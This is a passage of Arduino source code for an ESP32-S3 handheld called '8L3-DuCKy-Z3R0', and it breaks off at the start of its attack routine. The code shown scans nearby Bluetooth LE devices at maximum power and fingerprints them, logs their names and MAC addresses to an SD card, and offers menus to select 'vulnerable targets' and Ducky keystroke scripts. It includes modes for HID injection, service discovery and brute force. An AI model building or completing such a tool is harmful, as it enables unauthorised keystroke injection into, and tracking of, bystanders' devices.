#include <WiFi.h>
#include "BLEDevice.h"
#include "BLEUtils.h"
#include "BLEScan.h"
#include "BLEAdvertisedDevice.h"
#include "BLEServer.h"
#include "BLEClient.h"
#include "BLERemoteService.h"
#include "BLERemoteCharacteristic.h"
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SD.h>
#include <SPI.h>
#include <vector>
#include <string>

// ESP32-S3 specific configurations
#define ESP32_S3_BOARD 1

// Custom I2C pins - add these with your other pin definitions
#define CUSTOM_SDA_PIN 8    // Choose your desired SDA pin
#define CUSTOM_SCL_PIN 9    // Choose your desired SCL pin

// OLED Display settings
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SCREEN_ADDRESS 0x3C
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ESP32-S3 optimized button pins (using available GPIO)
#define BTN_UP 1        // GPIO1 (safe for ESP32-S3)
#define BTN_DOWN 2      // GPIO2 (safe for ESP32-S3)
#define BTN_SELECT 3    // GPIO3 (safe for ESP32-S3)
#define BTN_BACK 4      // GPIO4 (safe for ESP32-S3)

// ESP32-S3 SD Card pin (using VSPI)
#define SD_CS 10     // GPIO10 (safe for ESP32-S3)
#define SD_MOSI 11   // GPIO11
#define SD_MISO 13   // GPIO13
#define SD_SCK 12    // GPIO12

// SD Card logging settings
#define DEVICE_LOG_FILE "/device_log.csv"
#define SESSION_LOG_FILE "/sessions.log"

// Menu system variables
enum MenuState {
  MAIN_MENU,
  BLE_SCAN,
  DEVICE_LIST,
  SCRIPT_SELECT,
  TARGET_SELECT,
  EXECUTING,
  LOG_VIEWER
};

MenuState currentMenu = MAIN_MENU;
MenuState previousMenu = MAIN_MENU; // Track previous menu for back navigation
int menuIndex = 0;
int maxMenuItems = 0;

// BLE scanning and attack variables
BLEScan* pBLEScan;
BLEClient* pClient;
BLERemoteService* pRemoteService;
BLERemoteCharacteristic* pRemoteCharacteristic;

// HID Service UUIDs (standard)
#define HID_SERVICE_UUID "00001812-0000-1000-8000-00805f9b34fb"
#define HID_REPORT_UUID "00002a4d-0000-1000-8000-00805f9b34fb"
#define HID_REPORT_MAP_UUID "00002a4b-0000-1000-8000-00805f9b34fb"
#define HID_INFO_UUID "00002a4a-0000-1000-8000-00805f9b34fb"

std::vector<String> discoveredDevices;
std::vector<String> deviceMACs;
std::vector<String> deviceTypes;
std::vector<String> deviceRSSI;
std::vector<String> deviceServiceUUIDs;
std::vector<bool> selectedDevices;
int scanTime = 45; // seconds

// SD Card logging variables
std::vector<String> logEntries;
unsigned long sessionStartTime = 0;
int currentSessionID = 1;

bool isConnected = false;
String currentTargetMAC = "";
int attackMode = 0; // 0=HID injection, 1=Service discovery, 2=Brute force

// SD Card and script variables
std::vector<String> scriptFiles;
String selectedScript = "";

// Button debounce variables
unsigned long lastButtonPress = 0;
const unsigned long debounceDelay = 200;

// Menu items - updated to include log viewer
const char* mainMenuItems[] = {
  "1. Scan BLE Devices",
  "2. Select Targets",
  "3. Choose Script",
  "4. Execute Attack",
  "5. Attack Mode",
  "6. Device Info",
  "7. Advanced Scan",
  "8. View Device Log"
};

// ESP32-S3 specific optimizations
TaskHandle_t scanTaskHandle = NULL;
SemaphoreHandle_t displayMutex;

// Forward declarations
bool performGenericAttack();
void advancedBLEScanTask(void* parameter);
void saveDeviceToSD(String deviceName, String macAddress, String deviceType, int rssi, String serviceUUID);
void initializeSDLogging();
void createSessionLog();
void saveSessionSummary();
void viewDeviceLog();
bool isDeviceInLog(String macAddress);
String getCurrentTimestamp();
void goBackToPreviousMenu(); // NEW FUNCTION

void setup() {
  Serial.begin(115200);

  Wire.begin(CUSTOM_SDA_PIN, CUSTOM_SCL_PIN);

  // Initialize mutex for thread safety
  displayMutex = xSemaphoreCreateMutex();

  // Initialize buttons with ESP32-S3 specific settings
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  // Initialize OLED display
  if (!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
    Serial.println(F("SSD1306 allocation failed"));
    for (;;);
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("                     ");
  display.println("                     ");
  display.println("=== 8L3-DuCKy-Z3R0===");
  display.println("                     ");
  display.println("                     ");
  display.println("    8Y  Ju5t3nc4s3   ");
  display.println("                     ");
  display.println("                     ");
  display.display();
  delay(2000);
 // display.setTextSize(1);

  // Initialize ESP32-S3 optimized SPI for SD card
  SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);

  // Initialize SD card with ESP32-S3 settings
  if (!SD.begin(SD_CS)) {
    Serial.println("SD Card initialization failed!");
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("SD Card Error!");
    display.println("Check wiring:");
    display.println("CS:10 MOSI:11");
    display.println("MISO:13 SCK:12");
    display.display();
    delay(3000);
  } else {
    Serial.println("SD Card initialized successfully");
    loadScriptFiles();
    initializeSDLogging();
  }

  // Initialize BLE with ESP32-S3 enhanced settings
  BLEDevice::init("BLE-Scanner");
  BLEDevice::setPower(ESP_PWR_LVL_P9); // Max power for S3
  BLEDevice::setMTU(517); // Enhanced MTU for S3

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(50);  // Aggressive scanning
  pBLEScan->setWindow(49);

  // Create session log
  createSessionLog();

  //Serial.println("8L3-DuCKy-Z3R0 System initialized with SD logging and back button");
  //Serial.println("Flash size: " + String(ESP.getFlashChipSize() / 1024 / 1024) + "MB");
  //Serial.println("Free heap: " + String(ESP.getFreeHeap()) + " bytes");

  maxMenuItems = sizeof(mainMenuItems) / sizeof(mainMenuItems[0]);
  displayMainMenu();
}

void loop() {
  handleButtons();

  // ESP32-S3 optimized delay
  vTaskDelay(pdMS_TO_TICKS(50));
}

// BACK BUTTON FUNCTION
void goBackToPreviousMenu() {
  switch (currentMenu) {
    case MAIN_MENU:
      // Already at main menu, do nothing or show message
      showMessage("Already at\nMain Menu");
      delay(1000);
      displayMainMenu();
      break;
      
    case BLE_SCAN:
      // Go back to main menu
      previousMenu = currentMenu;
      currentMenu = MAIN_MENU;
      menuIndex = 0;
      displayMainMenu();
      break;
      
    case DEVICE_LIST:
      // Go back to main menu
      previousMenu = currentMenu;
      currentMenu = MAIN_MENU;
      menuIndex = 1; // Highlight "Select Targets" option
      displayMainMenu();
      break;
      
    case SCRIPT_SELECT:
      // Go back to main menu
      previousMenu = currentMenu;
      currentMenu = MAIN_MENU;
      menuIndex = 2; // Highlight "Choose Script" option
      displayMainMenu();
      break;
      
    case TARGET_SELECT:
      // Go back to device list
      previousMenu = currentMenu;
      currentMenu = DEVICE_LIST;
      menuIndex = 0;
      displayDeviceList();
      break;
      
    case EXECUTING:
      // Can't go back during execution, show message
      showMessage("Cannot exit\nduring attack");
      delay(1000);
      break;
      
    case LOG_VIEWER:
      // Go back to main menu
      previousMenu = currentMenu;
      currentMenu = MAIN_MENU;
      menuIndex = 7; // Highlight "View Device Log" option
      displayMainMenu();
      break;
      
    default:
      // Default to main menu
      previousMenu = currentMenu;
      currentMenu = MAIN_MENU;
      menuIndex = 0;
      displayMainMenu();
      break;
  }
}

// SD Card Logging Functions
void initializeSDLogging() {
  // Initialize device log file if it doesn't exist
  if (!SD.exists(DEVICE_LOG_FILE)) {
    File logFile = SD.open(DEVICE_LOG_FILE, FILE_WRITE);
    if (logFile) {
      logFile.println("Timestamp,SessionID,DeviceName,MACAddress,DeviceType,RSSI,ServiceUUID,FirstSeen");
      logFile.close();
      Serial.println("Created device log file with headers");
    } else {
      Serial.println("Failed to create device log file");
    }
  }

  // Get current session ID
  if (SD.exists(SESSION_LOG_FILE)) {
    File sessionFile = SD.open(SESSION_LOG_FILE, FILE_READ);
    if (sessionFile) {
      String lastLine = "";
      while (sessionFile.available()) {
        lastLine = sessionFile.readStringUntil('\n');
      }
      sessionFile.close();
      
      if (lastLine.length() > 0) {
        int commaIndex = lastLine.indexOf(',');
        if (commaIndex > 0) {
          currentSessionID = lastLine.substring(0, commaIndex).toInt() + 1;
        }
      }
    }
  }
  
  sessionStartTime = millis();
  Serial.println("Session ID: " + String(currentSessionID));
}

void createSessionLog() {
  File sessionFile = SD.open(SESSION_LOG_FILE, FILE_APPEND);
  if (sessionFile) {
    sessionFile.print(String(currentSessionID));
    sessionFile.print(",");
    sessionFile.print(getCurrentTimestamp());
    sessionFile.print(",START,Scanner Initialized");
    sessionFile.println();
    sessionFile.close();
    Serial.println("Session log created");
  }
}

void saveDeviceToSD(String deviceName, String macAddress, String deviceType, int rssi, String serviceUUID) {
  // Check if device already exists in current session
  bool isNewDevice = !isDeviceInLog(macAddress);
  
  File logFile = SD.open(DEVICE_LOG_FILE, FILE_APPEND);
  if (logFile) {
    // Format: Timestamp,SessionID,DeviceName,MACAddress,DeviceType,RSSI,ServiceUUID,FirstSeen
    logFile.print(getCurrentTimestamp());
    logFile.print(",");
    logFile.print(String(currentSessionID));
    logFile.print(",");
    logFile.print("\"" + deviceName + "\"");
    logFile.print(",");
    logFile.print(macAddress);
    logFile.print(",");
    logFile.print(deviceType);
    logFile.print(",");
    logFile.print(String(rssi));
    logFile.print(",");
    logFile.print(serviceUUID);
    logFile.print(",");
    logFile.print(isNewDevice ? "YES" : "NO");
    logFile.println();
    logFile.close();
    
    Serial.println("Device saved to SD: " + deviceName + " (" + macAddress + ")");
  } else {
    Serial.println("Failed to open device log file for writing");
  }
}

bool isDeviceInLog(String macAddress) {
  // Simple check - in production, you might want a more sophisticated approach
  for (const String& mac : deviceMACs) {
    if (mac == macAddress) {
      return true;
    }
  }
  return false;
}

String getCurrentTimestamp() {
  // Simple timestamp based on uptime - in production you'd use RTC
  unsigned long currentTime = millis();
  unsigned long seconds = currentTime / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;
  
  seconds %= 60;
  minutes %= 60;
  hours %= 24;
  
  String timestamp = "";
  if (hours < 10) timestamp += "0";
  timestamp += String(hours) + ":";
  if (minutes < 10) timestamp += "0";
  timestamp += String(minutes) + ":";
  if (seconds < 10) timestamp += "0";
  timestamp += String(seconds);
  
  return timestamp;
}

void saveSessionSummary() {
  File sessionFile = SD.open(SESSION_LOG_FILE);
  if (sessionFile) {
    sessionFile.print(String(currentSessionID));
    sessionFile.print(",");
    sessionFile.print(getCurrentTimestamp());
    sessionFile.print(",END,Devices found: ");
    sessionFile.print(String(discoveredDevices.size()));
    sessionFile.print(", Runtime: ");
    sessionFile.print(String((millis() - sessionStartTime) / 1000));
    sessionFile.print("s");
    sessionFile.println();
    sessionFile.close();
  }
}

void viewDeviceLog() {
  logEntries.clear();
  
  File logFile = SD.open(DEVICE_LOG_FILE, FILE_READ);
  if (!logFile) {
    showMessage("No device log\nfound on SD card");
    return;
  }
  
  // Skip header line
  if (logFile.available()) {
    logFile.readStringUntil('\n');
  }
  
  // Read log entries
  while (logFile.available() && logEntries.size() < 100) { // Limit to prevent memory issues
    String line = logFile.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      logEntries.push_back(line);
    }
  }
  logFile.close();
  
  if (logEntries.size() == 0) {
    showMessage("Device log is\nempty");
    return;
  }
  
  previousMenu = currentMenu; // Track where we came from
  currentMenu = LOG_VIEWER;
  menuIndex = max(0, (int)logEntries.size() - 1); // Start at the end (most recent)
  displayLogViewer();
}

void displayLogViewer() {
  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("=== DEVICE LOG ===");
    
    if (logEntries.size() == 0) {
      display.println("No entries found");
    } else {
      // Parse and display current log entry
      String entry = logEntries[menuIndex];
      
      // Split CSV entry (simplified parsing)
      std::vector<String> fields;
      String current = "";
      bool inQuotes = false;
      
      for (int i = 0; i < entry.length(); i++) {
        char c = entry.charAt(i);
        if (c == '"') {
          inQuotes = !inQuotes;
        } else if (c == ',' && !inQuotes) {
          fields.push_back(current);
          current = "";
        } else {
          current += c;
        }
      }
      fields.push_back(current); // Last field
      
      if (fields.size() >= 7) {
        String timestamp = fields[0];
        String sessionID = fields[1];
        String deviceName = fields[2];
        String macAddress = fields[3];
        String deviceType = fields[4];
        String rssi = fields[5];
        String isNew = fields[7];
        
        // Remove quotes from device name
        deviceName.replace("\"", "");
        
        display.println("Time: " + timestamp);
        display.println("Session: " + sessionID);
        
        String shortName = deviceName;
        if (shortName.length() > 16) {
          shortName = shortName.substring(0, 13) + "...";
        }
        display.println("Dev: " + shortName);
        
        String shortMAC = macAddress;
        if (shortMAC.length() > 17) {
          shortMAC = shortMAC.substring(0, 17);
        }
        display.println("MAC: " + shortMAC);
        
        display.println("Type: " + deviceType);
        display.print("RSSI: " + rssi + "dBm ");
        display.println(isNew == "YES" ? "(NEW)" : "(SEEN)");
      }
      
      display.println();
      display.print("Entry " + String(menuIndex + 1) + "/" + String(logEntries.size()));
    }
    
    // Show back button hint
    display.setCursor(90, 56);
    display.println("BACK");
    
    display.display();
    xSemaphoreGive(displayMutex);
  }
}

void handleButtons() {
  unsigned long currentTime = millis();
  if (currentTime - lastButtonPress < debounceDelay) {
    return;
  }

  if (digitalRead(BTN_UP) == LOW) {
    lastButtonPress = currentTime;
    handleUpButton();
  } else if (digitalRead(BTN_DOWN) == LOW) {
    lastButtonPress = currentTime;
    handleDownButton();
  } else if (digitalRead(BTN_SELECT) == LOW) {
    lastButtonPress = currentTime;
    handleSelectButton();
  } else if (digitalRead(BTN_BACK) == LOW) { // NEW BACK BUTTON HANDLING
    lastButtonPress = currentTime;
    handleBackButton();
  }
}

// BACK BUTTON HANDLER
void handleBackButton() {
  Serial.println("Back button pressed, current menu: " + String(currentMenu));
  goBackToPreviousMenu();
}

void handleUpButton() {
  switch (currentMenu) {
    case MAIN_MENU:
      menuIndex = (menuIndex - 1 + maxMenuItems) % maxMenuItems;
      displayMainMenu();
      break;
    case DEVICE_LIST:
      if (discoveredDevices.size() > 0) {
        menuIndex = (menuIndex - 1 + discoveredDevices.size()) % discoveredDevices.size();
        displayDeviceList();
      }
      break;
    case SCRIPT_SELECT:
      if (scriptFiles.size() > 0) {
        menuIndex = (menuIndex - 1 + scriptFiles.size()) % scriptFiles.size();
        displayScriptList();
      }
      break;
    case LOG_VIEWER:
      if (logEntries.size() > 0) {
        menuIndex = (menuIndex - 1 + logEntries.size()) % logEntries.size();
        displayLogViewer();
      }
      break;
  }
}

void handleDownButton() {
  switch (currentMenu) {
    case MAIN_MENU:
      menuIndex = (menuIndex + 1) % maxMenuItems;
      displayMainMenu();
      break;
    case DEVICE_LIST:
      if (discoveredDevices.size() > 0) {
        menuIndex = (menuIndex + 1) % discoveredDevices.size();
        displayDeviceList();
      }
      break;
    case SCRIPT_SELECT:
      if (scriptFiles.size() > 0) {
        menuIndex = (menuIndex + 1) % scriptFiles.size();
        displayScriptList();
      }
      break;
    case LOG_VIEWER:
      if (logEntries.size() > 0) {
        menuIndex = (menuIndex + 1) % logEntries.size();
        displayLogViewer();
      }
      break;
  }
}

void handleSelectButton() {
  switch (currentMenu) {
    case MAIN_MENU:
      handleMainMenuSelect();
      break;
    case DEVICE_LIST:
      toggleDeviceSelection();
      break;
    case SCRIPT_SELECT:
      selectScript();
      break;
    case BLE_SCAN:
      // Return to device list after scan
      previousMenu = currentMenu;
      currentMenu = DEVICE_LIST;
      menuIndex = 0;
      displayDeviceList();
      break;
    case LOG_VIEWER:
      // Return to main menu from log viewer
      previousMenu = currentMenu;
      currentMenu = MAIN_MENU;
      menuIndex = 0;
      displayMainMenu();
      break;
  }
}

void handleMainMenuSelect() {
  previousMenu = currentMenu; // Track where we came from
  
  switch (menuIndex) {
    case 0: // Scan BLE Devices
      startBLEScan();
      break;
    case 1: // Select Targets
      if (discoveredDevices.size() > 0) {
        currentMenu = DEVICE_LIST;
        menuIndex = 0;
        displayDeviceList();
      } else {
        showMessage("No devices found!\nScan first.");
      }
      break;
    case 2: // Choose Script
      if (scriptFiles.size() > 0) {
        currentMenu = SCRIPT_SELECT;
        menuIndex = 0;
        displayScriptList();
      } else {
        showMessage("No scripts found!\nCheck SD card.");
      }
      break;
    case 3: // Execute Attack
      executeAttack();
      break;
    case 4: // Attack Mode
      cycleAttackMode();
      break;
    case 5: // Device Info
      showDeviceInfo();
      break;
    case 6: // Advanced Scan
      startAdvancedBLEScan();
      break;
    case 7: // View Device Log
      viewDeviceLog();
      break;
  }
}

void startBLEScan() {
  previousMenu = currentMenu;
  currentMenu = BLE_SCAN;
  discoveredDevices.clear();
  deviceMACs.clear();
  deviceTypes.clear();
  deviceRSSI.clear();
  deviceServiceUUIDs.clear();
  selectedDevices.clear();

  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("8L3-DuCKy-Z3R0");
    display.println("Enhanced Mode");
    display.println();
    display.println("Scanning for");
    display.println("vulnerable targets");
    display.println();
    display.println("Power: MAX");
    display.println("Logging to SD...");
    
    // Show back button hint
    display.setCursor(90, 56);
    display.println("BACK");
    
    display.display();
    xSemaphoreGive(displayMutex);
  }

  BLEScanResults* foundDevices = pBLEScan->start(scanTime, false);

  for (int i = 0; i < foundDevices->getCount(); i++) {
    BLEAdvertisedDevice device = foundDevices->getDevice(i);
    String deviceInfo = "";
    String deviceType = "Unknown";
    String serviceUUID = "";

    if (device.haveName()) {
      deviceInfo = device.getName().c_str();
    } else {
      deviceInfo = "Unknown Device";
    }

    // Enhanced device analysis for S3
    if (device.haveServiceUUID()) {
      serviceUUID = device.getServiceUUID().toString().c_str();
      if (serviceUUID.indexOf("1812") >= 0) {
        deviceType = "HID Device";
      } else if (serviceUUID.indexOf("180f") >= 0) {
        deviceType = "Battery Service";
      } else if (serviceUUID.indexOf("1800") >= 0) {
        deviceType = "Generic Access";
      } else if (serviceUUID.indexOf("180a") >= 0) {
        deviceType = "Device Info";
      } else if (serviceUUID.indexOf("1801") >= 0) {
        deviceType = "Generic Attribute";
      }
    }

    if (device.haveAppearance()) {
      uint16_t appearance = device.getAppearance();
      if (appearance >= 960 && appearance <= 1023) {
        deviceType = "Keyboard/Mouse";
      } else if (appearance >= 832 && appearance <= 895) {
        deviceType = "Phone/Tablet";
      } else if (appearance >= 704 && appearance <= 767) {
        deviceType = "Watch";
      }
    }

    // Enhanced signal analysis
    int rssi = device.getRSSI();
    String signalStr = "";
    if (rssi > -50) signalStr = "****";
    else if (rssi > -70) signalStr = "***";
    else if (rssi > -85) signalStr = "**";
    else signalStr = "*";

    deviceInfo += " [" + deviceType + "]";
    deviceInfo += " " + signalStr;
    deviceInfo += " (" + String(rssi) + "dBm)";

    String macAddress = String(device.getAddress().toString().c_str());

    // Save device to SD card
    saveDeviceToSD(device.haveName() ? device.getName().c_str() : "Unknown Device", 
                   macAddress, deviceType, rssi, serviceUUID);

    discoveredDevices.push_back(deviceInfo);
    deviceMACs.push_back(macAddress);
    deviceTypes.push_back(deviceType);
    deviceRSSI.push_back(String(rssi));
    deviceServiceUUIDs.push_back(serviceUUID);
    selectedDevices.push_back(false);
  }

  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("Scan Complete!");
    display.print("Found: ");
    display.print(discoveredDevices.size());
    display.println(" devices");
    display.println("Saved to SD card");
    display.println();
    display.print("Free heap: ");
    display.print(ESP.getFreeHeap() / 1024);
    display.println("KB");
    display.println();
    display.println("SELECT: view devices");
    display.println("BACK: return to menu");
    display.display();
    xSemaphoreGive(displayMutex);
  }

  pBLEScan->clearResults(); // Clear results after processing
}

void startAdvancedBLEScan() {
  // Create enhanced scanning task for ESP32-S3
  if (scanTaskHandle == NULL) {
    xTaskCreatePinnedToCore(
      advancedBLEScanTask,
      "AdvancedBLEScan",
      8192,  // Stack size (S3 has more RAM)
      NULL,
      2,     // Priority
      &scanTaskHandle,
      1      // Core 1 for S3
    );
  }
}

void advancedBLEScanTask(void* parameter) {
  discoveredDevices.clear();
  deviceMACs.clear();
  deviceTypes.clear();
  deviceRSSI.clear();
  deviceServiceUUIDs.clear();
  selectedDevices.clear();

  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("ADVANCED SCAN");
    display.println("Multi-Core Mode");
    display.println("SD Logging ON");
    display.println();
    display.println("Deep scanning...");
    display.println("This may take");
    display.println("several minutes");
    
    // Show back button hint
    display.setCursor(90, 56);
    display.println("BACK");
    
    display.display();
    xSemaphoreGive(displayMutex);
  }

  // Enhanced scanning parameters for S3
  pBLEScan->setInterval(25);  // More aggressive
  pBLEScan->setWindow(24);
  pBLEScan->setActiveScan(true);

  // Multiple scan passes
  for (int pass = 0; pass < 3; pass++) {
    if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
      display.clearDisplay();
      display.setCursor(0, 0);
      display.println("SCAN PASS " + String(pass + 1) + "/3");
      display.println("Deep Mode");
      display.println("Logging to SD");
      display.println();
      display.print("Found so far: ");
      display.println(discoveredDevices.size());
      
      // Show back button hint
      display.setCursor(90, 56);
      display.println("BACK");
      
      display.display();
      xSemaphoreGive(displayMutex);
    }

    BLEScanResults* foundDevices = pBLEScan->start(15, false);
    for (int i = 0; i < foundDevices->getCount(); i++) {
      BLEAdvertisedDevice device = foundDevices->getDevice(i);
      String mac = String(device.getAddress().toString().c_str());

      // Check if device already found
      bool alreadyFound = false;
      for (const String& existingMAC : deviceMACs) {
        if (existingMAC == mac) {
          alreadyFound = true;
          break;
        }
      }

      if (!alreadyFound) {
        String deviceInfo = device.haveName() ? device.getName().c_str() : "Hidden Device";
        String deviceType = "Unknown";
        String serviceUUID = "";

        // Enhanced device fingerprinting
        if (device.haveServiceUUID()) {
          serviceUUID = device.getServiceUUID().toString().c_str();
          deviceType = analyzeServiceUUID(serviceUUID);
        }

        if (device.haveAppearance()) {
          deviceType = analyzeAppearance(device.getAppearance());
        }

        // Add manufacturer data analysis
        if (device.haveManufacturerData()) {
          String manufDataStr = device.getManufacturerData();
          std::string manufDataStd = std::string(manufDataStr.c_str());
          deviceType += analyzeManufacturerData(manufDataStd);
        }

        int rssi = device.getRSSI();
        String signalStr = (rssi > -50) ? "****" : (rssi > -70) ? "***" : (rssi > -85) ? "**" : "*";

        deviceInfo += " [" + deviceType + "]";
        deviceInfo += " " + signalStr;

        // Save to SD card
        saveDeviceToSD(device.haveName() ? device.getName().c_str() : "Hidden Device",
                       mac, deviceType, rssi, serviceUUID);

        discoveredDevices.push_back(deviceInfo);
        deviceMACs.push_back(mac);
        deviceTypes.push_back(deviceType);
        deviceRSSI.push_back(String(rssi));
        deviceServiceUUIDs.push_back(serviceUUID);
        selectedDevices.push_back(false);
      }
    }

    pBLEScan->clearResults();
    vTaskDelay(pdMS_TO_TICKS(2000)); // Delay between passes
  }

  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("ADVANCED COMPLETE");
    display.print("Total found: ");
    display.println(discoveredDevices.size());
    display.println("All saved to SD");
    display.println();
    display.println("Enhanced analysis");
    display.println("completed!");
    display.println();
    display.println("SELECT: view devices");
    display.println("BACK: return to menu");
    display.display();
    xSemaphoreGive(displayMutex);
  }

  // Clean up task
  scanTaskHandle = NULL;
  vTaskDelete(NULL);
}

String analyzeServiceUUID(String uuid) {
  uuid.toLowerCase();
  if (uuid.indexOf("1812") >= 0) return "HID Device";
  if (uuid.indexOf("180f") >= 0) return "Battery";
  if (uuid.indexOf("1800") >= 0) return "Generic";
  if (uuid.indexOf("180a") >= 0) return "Info Service";
  if (uuid.indexOf("1801") >= 0) return "Attribute";
  if (uuid.indexOf("180d") >= 0) return "Heart Rate";
  if (uuid.indexOf("1816") >= 0) return "Cycling";
  if (uuid.indexOf("181c") >= 0) return "User Data";
  return "Custom";
}

String analyzeAppearance(uint16_t appearance) {
  if (appearance >= 960 && appearance <= 1023) return "Keyboard/Mouse";
  if (appearance >= 832 && appearance <= 895) return "Phone/Tablet";
  if (appearance >= 704 && appearance <= 767) return "Watch";
  if (appearance >= 1157 && appearance <= 1159) return "Fitness";
  if (appearance >= 1344 && appearance <= 1359) return "Audio";
  return "Device";
}

String analyzeManufacturerData(std::string data) {
  if (data.length() >= 2) {
    uint16_t manufacturerID = (data[1] << 8) | data[0];
    switch (manufacturerID) {
      case 0x004C: return " (Apple)";
      case 0x0006: return " (Microsoft)";
      case 0x000F: return " (Broadcom)";
      case 0x0075: return " (Samsung)";
      case 0x00E0: return " (Google)";
      default: return " (ID:" + String(manufacturerID, HEX) + ")";
    }
  }
  return "";
}

void displayMainMenu() {
  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("=== 8L3-DuCKy-Z3R0===");
    display.println();

    // Show fewer items at once to fit screen
    int startIdx = max(0, menuIndex - 3);
    int endIdx = min(maxMenuItems, startIdx + 4);

    for (int i = startIdx; i < endIdx; i++) {
      if (i == menuIndex) {
        display.print("> ");
      } else {
        display.print("  ");
      }
      display.println(mainMenuItems[i]);
    }

    // Show position indicator
    display.println();
    display.print("(");
    display.print(menuIndex + 1);
    display.print("/");
    display.print(maxMenuItems);
    display.print(")");

    display.display();
    xSemaphoreGive(displayMutex);
  }
}

void displayDeviceList() {
  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("=== TARGETS ===");

    if (discoveredDevices.size() == 0) {
      display.println("No devices found");
    } else {
      int startIdx = max(0, menuIndex - 3);
      int endIdx = min((int)discoveredDevices.size(), startIdx + 4);

      for (int i = startIdx; i < endIdx; i++) {
        if (i == menuIndex) {
          display.print(">");
        } else {
          display.print(" ");
        }

        if (selectedDevices[i]) {
          display.print("[X] ");
        } else {
          display.print("[ ] ");
        }

        String shortName = discoveredDevices[i];
        if (shortName.length() > 18) {
          shortName = shortName.substring(0, 15) + "...";
        }
        display.println(shortName);
      }

      display.println();
      display.print("Selected: ");
      int selectedCount = 0;
      for (bool selected : selectedDevices) {
        if (selected) selectedCount++;
      }
      display.print(selectedCount);
      display.print("/");
      display.print(discoveredDevices.size());
    }
    
    // Show back button hint
    display.setCursor(90, 56);
    display.println("BACK");
    
    display.display();
    xSemaphoreGive(displayMutex);
  }
}

void displayScriptList() {
  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("=== SCRIPTS ===");

    if (scriptFiles.size() == 0) {
      display.println("No scripts found");
      display.println("Add .txt files");
      display.println("to SD card root");
    } else {
      int startIdx = max(0, menuIndex - 4);
      int endIdx = min((int)scriptFiles.size(), startIdx + 5);

      for (int i = startIdx; i < endIdx; i++) {
        if (i == menuIndex) {
          display.print("> ");
        } else {
          display.print("  ");
        }

        String shortName = scriptFiles[i];
        if (shortName.length() > 20) {
          shortName = shortName.substring(0, 17) + "...";
        }
        display.println(shortName);
      }

      display.println();
      display.print("(");
      display.print(menuIndex + 1);
      display.print("/");
      display.print(scriptFiles.size());
      display.print(")");
    }
    
    // Show back button hint
    display.setCursor(90, 56);
    display.println("BACK");
    
    display.display();
    xSemaphoreGive(displayMutex);
  }
}

void toggleDeviceSelection() {
  if (menuIndex < selectedDevices.size()) {
    selectedDevices[menuIndex] = !selectedDevices[menuIndex];
    displayDeviceList();
  }
}

void selectScript() {
  if (menuIndex < scriptFiles.size()) {
    selectedScript = scriptFiles[menuIndex];
    showMessage("Script selected:\n" + selectedScript);
    delay(2000);
    previousMenu = currentMenu;
    currentMenu = MAIN_MENU;
    menuIndex = 0;
    displayMainMenu();
  }
}

void loadScriptFiles() {
  scriptFiles.clear();
  File root = SD.open("/");
  if (!root) {
    Serial.println("Failed to open SD root directory");
    return;
  }

  File file = root.openNextFile();
  while (file) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      if (fileName.endsWith(".txt") || fileName.endsWith(".ducky")) {
        scriptFiles.push_back(fileName);
        Serial.println("Found script: " + fileName);
      }
    }
    file = root.openNextFile();
  }
  root.close();

  Serial.print("Loaded ");
  Serial.print(scriptFiles.size());
  Serial.println(" script files");
}

void executeAttack() {
  int selectedCount = 0;
  for (bool selected : selectedDevices) {
    if (selected) selectedCount++;
  }

  if (selectedCount == 0) {
    showMessage("No devices\nselected!");
    return;
  }

  if (selectedScript.length() == 0) {
    showMessage("No script\nselected!");
    return;
  }

  previousMenu = currentMenu;
  currentMenu = EXECUTING;

  if (xSemaphoreTake(displayMutex, portMAX_DELAY)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("=== ATTACKING ===");
    display.println();
    display.print("Script: ");
    String shortScript = selectedScript;
    if (shortScript.length() > 12) {
      shortScript = shortScript.substring(0, 9) + "...";
    }
    display.println(shortScript);
    display.print("Targets: ");
    display.println(selectedCount);
    display.println();
    display.println("Enhanced mode");
    display.println("Launching attacks...");
    display.println();
    display.println("Cannot exit during");
    display.println("attack execution");
    display.display();
    xSemaphoreGive(displayMutex);
  }

  // Log attack session start
  File sessionFile = SD.open(SESSION_LOG_FILE, FILE_APPEND);
  if (sessionFile) {
    sessionFile.print(String(currentSessionID));
    sessionFile.print(",");
    sessionFile.print(getCurrentTimestamp());
    sessionFile.print(",ATTACK,Script: ");
    sessionFile.print(selectedScript);
    sessionFile.print(", Targets: ");
    sessionFile.print(String(selectedCount));
    sessionFile.println();
    sessionFile.close();
  }

  // Execute attack on selected devices with S3 optimizations
